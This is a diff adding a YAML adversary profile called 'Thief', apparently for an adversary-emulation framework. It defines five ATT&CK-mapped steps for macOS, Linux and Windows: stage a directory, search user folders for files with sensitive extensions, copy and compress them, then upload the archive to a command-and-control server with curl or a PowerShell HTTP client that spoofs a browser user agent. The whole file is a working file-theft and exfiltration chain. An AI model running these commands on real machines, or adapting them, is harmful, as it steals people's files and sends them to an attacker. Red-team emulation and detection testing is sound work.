@@ -1,0 +1,159 @@
+id: 1a98b8e6-18ce-4617-8cc5-e65a1a9d490e
+name: Thief
+description: An adversary to steal sensitive files
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 6469befa-748a-4b9c-a96d-f191fde47d89
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- 4e97e699-93d7-4040-b5a3-2e906a58199e
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+abilities:
+ 6469befa-748a-4b9c-a96d-f191fde47d89:
+  name:  Create staging directory
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       mkdir -p staged && echo $PWD/staged
+   - sh:
+     platform: linux
+     command: |
+       mkdir -p staged && echo $PWD/staged
+   - psh:
+     platform: windows
+     command: |
+       New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
+   - pwsh:
+     platform: windows
+     command: |
+       New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
+ 90c2efaa-8205-480d-8bb6-61d90dbaf81b:
+  name:  Find files
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+   - psh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - pwsh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - sh:
+     platform: linux
+     command: |
+       find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+ 4e97e699-93d7-4040-b5a3-2e906a58199e:
+  name:  Stage sensitive files
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - sh:
+     platform: linux
+     command: |
+       cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - psh:
+     platform: windows
+     command: |
+       Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - cmd:
+     platform: windows
+     command: |
+       copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+ 300157e5-f4ad-4569-b533-9d1fa0e74d74:
+  name:  Compress staged directory
+  tactic:  exfiltration
+  technique_name:  "Archive Collected Data: Archive via Utility"
+  technique_id:  T1560.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - sh:
+     platform: linux
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - psh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+   - pwsh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+ ea713bc4-63f0-491c-9a6f-0b01d560b87e:
+  name:  Exfil staged directory
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - sh:
+     platform: linux
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - psh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
+   - pwsh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
